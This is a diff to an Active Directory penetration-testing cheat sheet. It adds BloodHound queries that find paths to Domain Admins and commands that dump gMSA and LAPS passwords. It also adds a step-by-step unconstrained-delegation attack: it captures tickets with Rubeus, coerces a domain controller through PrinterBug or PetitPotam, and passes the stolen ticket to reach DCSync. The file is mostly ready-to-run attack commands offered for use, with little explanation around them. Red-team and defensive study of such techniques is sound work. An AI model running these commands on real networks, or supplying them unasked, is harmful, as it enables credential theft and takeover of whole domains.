@@ -29,6 +29,26 @@ MATCH p=shortestPath((n {owned:true})-[r:MemberOf|GenericAll|GenericWrite|WriteD
 RETURN p
 ```
 
+*Note: the query above uses legacy BloodHound (v4) syntax. BloodHound CE uses a different schema — node properties and edge names may differ. Verify against your installed version.*
+
+**Additional useful queries (legacy BH syntax — adapt property names for CE):**
+```cypher
+-- Users who can DCSync
+MATCH (n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name
+
+-- Computers where Domain Users can RDP
+MATCH (g:Group {name:'DOMAIN USERS@DOMAIN.LOCAL'})-[:CanRDP]->(c:Computer) RETURN c.name
+
+-- Kerberoastable users with a path to DA
+MATCH (u:User {hasspn:true}), p=shortestPath((u)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN u.name, LENGTH(p) ORDER BY LENGTH(p)
+
+-- Computers with LAPS enabled
+MATCH (c:Computer) WHERE c.haslaps=true RETURN c.name
+
+-- Sessions: find where Domain Admins are logged in
+MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN c.name, u.name
+```
+
 ---
 
 ## ACL Abuse — Exploiting BloodHound Edges
@@ -103,7 +123,9 @@ Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Righ
 ### ReadGMSAPassword — extract a gMSA's usable password
 **Explanation:** the `msDS-ManagedPassword` blob on a gMSA is decodable straight to an NT hash if you can read it — no cracking, immediately usable for pass-the-hash.
 ```bash
-gMSADumper.py -u attacker -p pass -d domain.local -l <DC_IP>
+gMSADumper.py -u attacker -p pass -d domain.local -l ldap://<DC_IP>
+# nxc native method:
+nxc ldap <DC_IP> -u user -p pass --gmsa
 ```
 **Reference:** https://github.com/micahvandeusen/gMSADumper
 
@@ -121,6 +143,18 @@ ldapsearch -x -H ldap://<DC_IP> -D "attacker@domain.local" -w pass -b "DC=domain
 Get-LapsADPassword -Identity targetcomputer -AsPlainText
 ```
 **Reference:** https://www.thehacker.recipes/ad/movement/credentials/dumping/laps · https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword
+
+**Windows LAPS v2 (encrypted passwords):**
+Recent nxc versions (`-M laps`) handle v2 decryption natively. For manual reads:
+```bash
+bloodyAD --host <DC_IP> -d domain.local -u user -p pass get object 'COMPUTER$' --attr msLAPS-EncryptedPassword
+```
+For discovery of which groups can read LAPS:
+```powershell
+# LAPSToolkit.ps1
+Find-LAPSDelegatedGroups
+Get-LAPSComputers
+```
 
 ---
 
@@ -169,6 +203,23 @@ impacket-findDelegation -dc-ip <DC_IP> DOMAIN/USER:PASSWORD   # enumerate all de
 ```
 **Faster (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD --trusted-for-delegation` lists delegation-trusted accounts directly.
 
+**Exploitation (compromised unconstrained-delegation host):**
+```bash
+# 1. Monitor for incoming TGTs on the compromised host
+Rubeus.exe monitor /interval:5 /nowrap
+# or from Linux:
+krbrelayx.py --target dc01.domain.local
+
+# 2. Coerce a DC to authenticate (PrinterBug / PetitPotam)
+python3 printerbug.py domain.local/user:pass@dc01.domain.local compromised-host.domain.local
+# or:
+python3 PetitPotam.py compromised-host.domain.local dc01.domain.local
+
+# 3. Rubeus captures the DC's TGT — extract and use it
+Rubeus.exe ptt /ticket:<base64-ticket>
+# Now you have the DC machine account's TGT — DCSync or PSExec to the DC
+```
+
 ### Constrained delegation with protocol transition (S4U2Self + S4U2Proxy)
 ```bash
 getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svcaccount:password
@@ -180,7 +231,7 @@ Identify which case applies before choosing an approach:
 - **Without protocol transition** — `msDS-AllowedToDelegateTo` is set but `TRUSTED_TO_AUTH_FOR_DELEGATION` is NOT. S4U2Self is unavailable for arbitrary impersonation; `getST.py -impersonate` will fail unless you already hold the victim's own TGT (S4U2Self via a real TGT still functions, then S4U2Proxy chains from it). In that case, obtain the victim's TGT first (`getTGT.py` with their creds/hash, or extract via mimikatz), then request the referral service ticket:
 ```bash
 getTGT.py domain.local/victimuser:password
-KRB5CCNAME=victimuser.ccache getST.py -spn cifs/target.domain.local -impersonate victimuser domain.local/svcaccount:password
+KRB5CCNAME=victimuser.ccache getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svcaccount:password
 ```
 
 ### RBCD (Resource-Based Constrained Delegation)
